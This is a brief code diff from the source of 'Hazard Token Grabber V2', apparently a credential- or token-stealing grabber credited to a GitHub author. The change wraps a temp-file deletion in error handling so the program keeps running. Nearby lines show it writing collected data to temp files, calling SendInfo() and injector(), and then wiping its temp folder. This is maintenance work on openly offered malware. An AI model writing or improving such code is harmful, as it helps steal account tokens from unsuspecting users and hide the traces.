@@ -92,8 +92,10 @@ class Hazard_Token_Grabber_V2(functions):
                         with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                             fp.write(x+"\n\nMade by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2")
                     else:
-                        os.remove(self.tempfolder+os.sep+i)
-
+                        try:
+                            os.remove(self.tempfolder+os.sep+i)
+                        except (WindowsError, PermissionError):
+                            pass
         self.SendInfo()
         self.injector()
         shutil.rmtree(self.tempfolder)
